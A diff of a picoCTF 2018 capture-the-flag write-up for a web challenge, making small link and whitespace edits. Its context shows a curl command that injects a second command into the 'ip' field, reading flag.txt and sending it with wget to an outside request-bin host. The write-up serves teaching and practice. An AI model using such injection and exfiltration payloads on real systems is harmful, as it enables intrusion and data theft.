@@ -1,7 +1,7 @@
 # fancy-alive-monitoring (Web)
 
 >One of my school mate developed an alive monitoring tool.
->Can you get a flag from http://2018shell1.picoctf.com:43316 (link)? 
+>Can you get a flag from http://2018shell1.picoctf.com:43316 (link)?
 
 ### [~$ cd ..](../)
 
@@ -67,7 +67,7 @@ The source we are given is as follows:
 Fancy regex on server side, uh? Well, for some unknown reason, the regex's are not the same! On the server, we can append data at the end.
 However, we had to find a way to exfiltrate the result of the command, since it's not displayed by the actual script.
 
-We first created a temporary URL grabber on [postb.in](postb.in), and then used `curl` to bypass the Javascript sanity check:
+We first created a temporary URL grabber on [postb.in](https://postb.in/), and then used `curl` to bypass the Javascript sanity check:
 
 > ```sh
 >% curl --data 'ip=8.8.8.8 1> /dev/null; wget "http://postb.in/tAZgj8lO?p=$(cat flag.txt)"' http://2018shell1.picoctf.com:43316/ -v
@@ -76,5 +76,3 @@ We first created a temporary URL grabber on [postb.in](postb.in), and then used 
 
 The first part of the command redirects the standard output of the command to `/dev/null`, which allows the PHP script to continue until the end. The second
 part, after the semi-colon exfiltrate the flag, and we got: **picoCTF{n3v3r_trust_a_b0x_c4a9b715}**
-
-
